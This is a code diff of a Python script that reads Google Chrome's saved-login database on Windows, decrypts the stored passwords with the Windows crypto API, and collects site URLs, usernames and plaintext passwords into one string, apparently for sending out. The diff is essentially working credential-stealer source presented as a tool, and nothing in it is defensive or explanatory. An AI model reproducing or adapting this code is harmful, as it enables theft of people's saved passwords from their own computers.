@@ -1,16 +1,17 @@
-from os import getenv
+from os import getenv, sep
 import sqlite3
 import win32crypt
 
-appdata = getenv("APPDATA") 
-connection = sqlite3.connect(appdata + "\..\Local\Google\Chrome\User Data\Default\Login Data")
-cursor = connection.cursor()
-cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-for information in cursor.fetchall():
-        #chrome encrypts the password with Windows WinCrypt.
-	#Fortunately Decrypting it is no big issue.
-        pass = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
-	if pass:
-		print 'website_link ' + information[0]
-		print 'Username: ' + information[1]
-		print 'Password: ' + pass
+sendpass = ''
+appdata = getenv("APPDATA")
+try:
+	connection = sqlite3.connect(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep,sep))
+	cursor = connection.cursor()
+	cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
+	for information in cursor.fetchall():
+		passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
+		if passw:
+			sendpass += '**n [*] Website-origin: ' + information[0] + '**n [*] Website-action: ' + information[1]
+			sendpass += '**n [*] Username: ' + information[2]
+			sendpass += '**n [*] Password: ' + passw + '**n'
+	print sendpass
